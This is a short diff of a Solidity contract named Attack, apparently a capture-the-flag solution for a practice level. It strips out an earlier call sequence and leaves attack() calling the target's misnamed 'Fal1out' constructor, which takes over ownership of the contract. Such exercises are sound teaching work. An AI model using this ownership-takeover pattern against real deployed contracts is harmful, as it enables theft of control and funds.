@@ -17,11 +17,6 @@ contract Attack {
     }
 
     function attack() public payable {
-        target.allocate{ value: 0.0001 ether }();
-        target.sendAllocation(payable(address(this)));
-    }
-
-    receive() external payable {
-        target.Fal1out{ value: 0.0001 ether }();
+        target.Fal1out{ value: 0.0001 ether}();
     }
 }
